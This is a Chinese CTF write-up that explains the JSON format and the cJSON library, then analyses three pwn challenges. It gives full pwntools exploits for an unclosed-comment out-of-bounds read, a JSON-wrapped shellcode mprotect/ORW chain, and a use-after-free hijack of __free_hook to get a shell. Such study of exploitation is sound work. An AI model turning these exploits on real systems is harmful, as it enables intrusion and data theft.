# cjson&json 二进制漏洞利用总结-先知社区

> **来源**: https://xz.aliyun.com/news/16365  
> **文章ID**: 16365

---

# 简介

**JSON（JavaScript Object Notation）**是一种轻量级的数据交换格式，易于人阅读和编写，同时也易于机器解析和生成。它以纯文本形式存储和传输数据，广泛应用于客户端和服务器之间的数据交互。

## JSON格式

* 键/值对用冒号 `:` 分隔。
* 多个键/值对之间用逗号 `,` 分隔。
* 对象和数组可以嵌套，即可以在对象中包含其他对象或数组，或者在数组中包含对象或其他数组。

## 每个格式例子

### 字符串（String）

```
{
    "greeting": "Hello, World!"
}
```

### 数字（Number）

```
{
    "age": 25,
    "height": 1.75
}
```

### 布尔值（Boolean）

```
{
    "isStudent": true,
    "isGraduated": false
}
```

### 空值（Null）

```
{
    "middleName": null
}
```

### 对象（Object）

```
{
    "person": {
        "name": "Bob",
        "age": 30
    }
}
```

### 数组（Array）

```
json
{
    "fruits": ["apple", "banana", "cherry"]
}
```

### 嵌套数组和对象

```
{
    "company": "Tech Corp",
    "established": 1999,
    "isPublic": true,
    "employees": [
        {
            "name": "Alice",
            "age": 28,
            "skills": ["Java", "Python"],
            "address": {
                "city": "New York",
                "postalCode": null
            }
        },
        {
            "name": "Bob",
            "age": 34,
            "skills": ["JavaScript", "HTML"],
            "address": {
                "city": "San Francisco",
                "postalCode": "94123"
            }
        }
    ]
}
```

cJSON 是一个轻量级的 C 语言库，用于高效地解析和生成 JSON 数据。它提供简单易用的 API，支持基本的 JSON 数据类型，如对象、数组、字符串、数字、布尔值和空值。cJSON 的设计注重性能和内存占用，适合嵌入式系统和资源受限的环境，能够在多种操作系统上运行，广泛用于需要 JSON 数据交互的应用中。

### 字符串（String）

## cJSON结构体

```
typedef struct cJSON
{
  struct cJSON *next, *prev;
  struct cJSON *child;

  int type;

  char *valuestring;
  int valueint;
  double valuedouble;

  char *string;
} cJSON;
```

* **next**: 指向下一个同级 JSON 对象或元素的指针。这使得 `cJSON` 能够形成一个链表，从而支持 JSON 数组和对象的遍历。
* **prev**: 指向前一个同级 JSON 对象或元素的指针。与 `next` 一起，这提供了双向遍历的能力。
* **child**: 指向当前 JSON 对象的第一个子元素的指针。对于嵌套的 JSON 对象，可以通过这个指针访问子对象或子数组。

`type` 用于区分 JSON 对象的不同类型，具体值及其含义如下：

```
- 0: `false` — 表示布尔假值
- 1: `true` — 表示布尔真值
- 2: `null` — 表示空值
- 3: `number` — 表示数值（整数或浮点数）
- 4: `string` — 表示字符串
- 5: `array` — 表示数组
- 6: `object` — 表示对象（键值对）
```

* `type` 与 `string` 和 `value*` 的关系
  + `type` 字段决定了当前 `cJSON` 实例的具体类型，这直接影响 `string` 和 `value*` 字段的有效性。
  + 只有当 `type` 值为 `4` 时，`valuestring` 字段才有效，意味着只有在当前类型为字符串时，该字段才会被赋予实际的字符串数据。
  + 只有当 `type` 值为 `3` 时，`valueint` 或 `valuedouble` 字段才有效，这表明在当前类型为数字时，这些字段将被填充有效的数值数据。

![](images/20241226224953-aa5424a8-c398-1.png)

## 序列化cJSON结构体

![](images/20241226224958-ad5851ce-c398-1.png)

# 2021 SCTF dataleak

## 程序保护

![](images/20241226225102-d3998c0e-c398-1.png)

## 漏洞分析

![](images/20241226225107-d681ffa0-c398-1.png)

这里初看是没有什么漏洞的，不存在溢出和连带读的情况，但是有个cJSON\_minify函数 通过ida对给的libcjson文件静态分析发现

![](images/20241226225112-d9cc9684-c398-1.png)

将这个转化一下为

```
#include <stdint.h>
#include <stdbool.h>

void cJSON_Minify(char *json) {
    if (!json) return;

    char *jsona = json;  
    uint8_t *into = (uint8_t *)json; 

    while (*jsona) {
        switch (*jsona) {
            case ' ': case '\t': case '\r': case '\n':
                jsona++; // Skip whitespace
                break;
            case '/':
                if (jsona[1] == '/') {
                    while (*jsona && *jsona != '\n') jsona++; // Skip single-line comment
                } else if (jsona[1] == '*') {
                    jsona += 2; // Skip the /*
                    while (*jsona && !(*jsona == '*' && jsona[1] == '/')) {
                        if (!*jsona) return; // Exit if we reach the end without closing
                        jsona++; // Skip until end of comment
                    }
                    jsona += 2; // Skip the */
                } else {
                    *into++ = *jsona++; // Copy character
                }
                break;
            case '"':
                *into++ = *jsona++;
                while (*jsona && *jsona != '"') {
                    *into++ = *jsona++; // Copy character
                    if (*(jsona - 1) == '\\') *into++ = *jsona++; // Copy escaped character
                }
                if (*jsona) *into++ = *jsona++; // Copy closing quote
                break;
            default:
                *into++ = *jsona++; // Copy normal character
                break;
        }
    }
    *into = 0; // Null-terminate the new string
}
```

这里存在一个注释没有对未闭合进行检测的情况，就比如如果我是/*aaaaaaaaaaaaaaaaaa 但是没闭合的话 这种情况就会一直执行这个循环 也就是jsona++但是我们读入是通过* into++ = \*jsona++进行的读入 就会导致我们可以越界读到程序让我们leak的位置

![](images/20241226225123-dfe1c0e4-c398-1.png)

可以看到正常读入是这个样子，此时我们需要泄露的this\_is\_data\_in\_server有22字节，按照我们上面的分析如果全是注释没闭合那么，就会把this读入到xxx90的位置，rsi是我们wirite的地址，也就是读出末尾的server

![](images/20241226225129-e3a358be-c398-1.png)

那么我们就可以通过控制注释的size 来分两次读出flag

## exp

```
#!/usr/bin/python3
from pwn import *
import random
import os
import sys
import time
from pwn import *
from ctypes import *
import json

#--------------------setting context---------------------
context.clear(arch='amd64', os='linux', log_level='debug')

#context.terminal = ['tmux', 'splitw', '-h']
sla = lambda data, content: mx.sendlineafter(data,content)
sa = lambda data, content: mx.sendafter(data,content)
sl = lambda data: mx.sendline(data)
rl = lambda data: mx.recvuntil(data)
re = lambda data: mx.recv(data)
sa = lambda data, content: mx.sendafter(data,content)
inter = lambda: mx.interactive()
l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))
s=lambda data: mx.send(data)
log_addr=lambda data: log.success("--->"+hex(data))
p = lambda s: print('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))

def dbg():
    gdb.attach(mx)

#---------------------------------------------------------
# libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')
filename = "./pwn"
mx = process(filename)
#mx = remote("0192d63fbe8f7e5f9ab5243c1c69490f.q619.dg06.ciihw.cn",43013)
elf = ELF(filename)
libc=elf.libc
#初始化完成---------------------------------------------------------\
s('aaaaaaaa/*'.ljust(0xe,'a'))
sleep(0.5)
s('aaaaaaaa/*'.ljust(0xe,'b')) #'this_is_dat'
flag1=mx.recv(0xb)

s('aaaaa/*'.ljust(0xe,'a'))
sleep(0.5)
s('/*'.ljust(0xe,'b')) #'this_is_dat'
flag2=mx.recv(0xb)
print(flag1+flag2)
inter()
```

![](images/20241226225140-ea4eb550-c398-1.png)

# 2024 强网拟态 ezcode

## 程序保护

![](images/20241226225208-faf9250c-c398-1.png)

## 漏洞分析

![](images/20241226225212-fd7909b4-c398-1.png)

这里有个cJSON\_Parse 将JSON字符串反序列化为CJSON结构体 并且cJSON\_GetObjectItemCaseSensitive(v7, "shellcode"); 取的是shellcode的值 因此我们只要

```
{
"shellcode":content.hex()
}
```

以这个格式就可以传输了 我们可以测试一下

可以看到我们是可以传输的：

![](images/20241226225247-120fba94-c399-1.png)

但是题目限制了22字节的shellcode 并且此时的0x9998000段是没有可写权限的 因此我们要mprotect赋予权限 并且 再次read一次读入orw的shellcode

这里要设置一下

rdi要为0x9998000 rsi要为len 不变就行 rdx为7

```
shl edi,12
mov ax,10
mov dx,7
syscall
```

rdi为

```
xor eax, eax;
xor edi, edi;
mov dl, 0xff;
mov esi, ecx;
syscall
```

但是这里是24字节，多了两字节 可以从这里优化mov dx,7 改为lea edx,[rax-3]

刚好22字节 然后就读入shellcode进行orw就可以了

orw\_shellcode

```
mov rdi,rsi
xor rsi,rsi
xor rdx,rdx
mov rax,2
syscall
xor rdi,0xc
mov rsi,rdi
xor dl,30
mov rdi,rax
xor rax,rax
syscall
mov rdi,1
mov ax,1
syscall
```

## exp

```
#!/usr/bin/python3
from pwn import *
import random
import os
import sys
import time
from pwn import *
from ctypes import *
import json

#--------------------setting context---------------------
context.clear(arch='amd64', os='linux', log_level='debug')

#context.terminal = ['tmux', 'splitw', '-h']
sla = lambda data, content: mx.sendlineafter(data,content)
sa = lambda data, content: mx.sendafter(data,content)
sl = lambda data: mx.sendline(data)
rl = lambda data: mx.recvuntil(data)
re = lambda data: mx.recv(data)
sa = lambda data, content: mx.sendafter(data,content)
inter = lambda: mx.interactive()
l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))
s=lambda data: mx.send(data)
log_addr=lambda data: log.success("--->"+hex(data))
p = lambda s: print('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))

def dbg():
    gdb.attach(mx)
#---------------------------------------------------------
# libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')
filename = "./vuln"
mx = process(filename)
#mx = remote("0192d63fbe8f7e5f9ab5243c1c69490f.q619.dg06.ciihw.cn",43013)
elf = ELF(filename)
libc=elf.libc
#初始化完成---------------------------------------------------------\


content=asm(
'''
shl edi, 12
mov ax,10
lea edx,[rax-3]
syscall
xor eax, eax;
xor edi, edi;
mov dl, 0xff;
mov esi, ecx;
syscall
'''
)
print(len(content))
payload={
"shellcode":content.hex()
}
sl(json.dumps(payload))
orw=asm(
'''
mov rdi,rsi
xor rsi,rsi
xor rdx,rdx
mov rax,2
syscall
xor rdi,0xc
mov rsi,rdi
xor dl,30
mov rdi,rax
xor rax,rax
syscall
mov rdi,1
mov ax,1
syscall
'''
)
payload=b'flag\x00'+b'\x00'*5+orw
sl(payload)
inter()
```

![](images/20241226225301-1a9b2f72-c399-1.png)

# 2024 ciscn决赛 ezheap

## 程序保护

![](images/20241226225327-2a357fb4-c399-1.png)

## 漏洞分析

![](images/20241226225333-2dd488b8-c399-1.png)

从这里可以看出来是有一个取值的过程，并且是相互对应的，如果没有取出来则会进入error退出程序

而v10来源于v13经过处理函数，跟进这个函数发现：

![](images/20241226225339-3159870e-c399-1.png)

存在一些json格式的特征，像null false true这种就是json格式中的布尔值，同时也有闭合{}的检测 因此可以基本确定发送的是json格式

### 交互脚本

```
def add(size,cont):
    payload='{'+'"choice":"new",'+'"index":1,'+f'"length":{size},'+'"message":'+'"'
    payload=payload.encode()
    payload+=cont
    payload+=b'"'+b'}'
    sl(payload)
def delete(num):
    payload = f'{{"choice":"rm","index":{num},"length":32,"message":"aaa"}}'
    rl("Please input:")
    sl(payload)
def show(num):
    payload = f'{{"choice":"view","index":{num},"length":32,"message":"aaa"}}'
    rl("Please input:")
    sl(payload)
def edit(idx,len,cont):
    payload='{'+'"choice":"modify",'+f'"index":{idx},'+f'"length":{len},'+'"message":'+'"'
    payload=payload.encode()
    payload+=cont
    payload+=b'"'+b'}'
    print(payload)
    sl(payload)
```

## 漏洞分析

![](images/20241226225349-370f2032-c399-1.png)

没有置0 这里存在uaf漏洞 并且是2.31 存在uaf漏洞且没限制基本随便打了，这里难点就是因为是json的传输，导致泄露的时候会有一些干扰 我们要通过调试来调整传输的东西进行泄露

## exp

```
#!/usr/bin/python3
from pwn import *
import random
import os
import sys
import time
from pwn import *
from ctypes import *


#--------------------setting context---------------------
context.clear(arch='amd64', os='linux', log_level='debug')

#context.terminal = ['tmux', 'splitw', '-h']
sla = lambda data, content: mx.sendlineafter(data,content)
sa = lambda data, content: mx.sendafter(data,content)
sl = lambda data: mx.sendline(data)
rl = lambda data: mx.recvuntil(data)
re = lambda data: mx.recv(data)
sa = lambda data, content: mx.sendafter(data,content)
inter = lambda: mx.interactive()
l64 = lambda:u64(mx.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
h64=lambda:u64(mx.recv(6).ljust(8,b'\x00'))
s=lambda data: mx.send(data)
log_addr=lambda data: log.success("--->"+hex(data))
p = lambda s: print('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))

def dbg():
    gdb.attach(mx)

#---------------------------------------------------------
# libc = ELF('/home/henry/Documents/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6')
filename = "./pwn"
mx = process(filename)
#mx = remote("0192d63fbe8f7e5f9ab5243c1c69490f.q619.dg06.ciihw.cn",43013)
elf = ELF(filename)
libc=elf.libc
#初始化完成---------------------------------------------------------\
def add(size,cont):
    payload='{'+'"choice":"new",'+'"index":1,'+f'"length":{size},'+'"message":'+'"'
    payload=payload.encode()
    payload+=cont
    payload+=b'"'+b'}'
    sl(payload)
def delete(num):
    payload = f'{{"choice":"rm","index":{num},"length":32,"message":"aaa"}}'
    rl("Please input:")
    sl(payload)
def show(num):
    payload = f'{{"choice":"view","index":{num},"length":32,"message":"aaa"}}'
    rl("Please input:")
    sl(payload)
def edit(idx,len,cont):
    payload='{'+'"choice":"modify",'+f'"index":{idx},'+f'"length":{len},'+'"message":'+'"'
    payload=payload.encode()
    payload+=cont
    payload+=b'"'+b'}'
    print(payload)
    sl(payload)

add(0x400,b'a') #0
add(0x400,b'a') #1
delete(0)
for i in range(6):
    edit(0,0x400,b'a'*0x10)
    delete(0)
dbg()
delete(1)
add(0x60,b'') #2

edit(2,1,b'\xe0')
show(2)
libc_addr=l64()-0x1ecbe0
log_addr(libc_addr)
libc.address=libc_addr
system=libc.sym['system']
free_hook=libc.sym['__free_hook']
edit(0,0x8,p64(free_hook)[:6])
add(0x400,b'a;/bin/sh')
#edit(2,0x10,b'/bin/sh\x00')#
add(0x400,b'a')
edit(4,0x8,p64(system)[:6])
delete(3)
inter()
```

![](images/20241226225412-44c5bbd2-c399-1.png)
